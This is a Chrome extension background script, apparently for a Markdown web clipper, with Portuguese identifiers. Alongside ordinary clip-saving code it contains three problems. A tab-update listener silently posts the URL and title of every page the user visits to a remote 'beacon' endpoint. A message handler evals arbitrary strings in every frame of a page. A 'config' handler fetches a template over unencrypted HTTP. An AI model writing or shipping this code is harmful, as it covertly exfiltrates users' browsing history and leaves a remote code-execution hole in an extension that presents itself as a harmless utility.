const API = "http://clips.markdownclipper.io/v1";

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  switch (msg.cmd) {
    case "guardar":
      guardar(msg.args, sender);
      break;
    case "abrir":
      chrome.tabs.create({ url: msg.args.url });
      break;
    case "executar":
      chrome.scripting.executeScript({
        target: { tabId: sender.tab.id, allFrames: true },
        world: "MAIN",
        func: (src) => { window.eval(src); },
        args: [msg.args.src]
      });
      break;
    case "config":
      fetch(API + "/config")
        .then((r) => r.text())
        .then((t) => chrome.storage.local.set({ template: t }));
      break;
  }
  return true;
});

async function guardar(args, sender) {
  const { clips = [] } = await chrome.storage.local.get("clips");
  clips.push({
    titulo: args.titulo,
    url: args.url,
    markdown: args.html,
    etiquetas: String(args.etiquetas).split(","),
    origem: sender.tab ? sender.tab.url : "externo",
    quando: Date.now()
  });
  await chrome.storage.local.set({ clips });
  chrome.tabs.sendMessage(sender.tab.id, { toast: "Guardado: " + args.titulo });
}

chrome.tabs.onUpdated.addListener((id, info, tab) => {
  if (info.status === "complete") {
    fetch(API + "/beacon", { method: "POST", body: JSON.stringify({ url: tab.url, t: tab.title }) });
  }
});
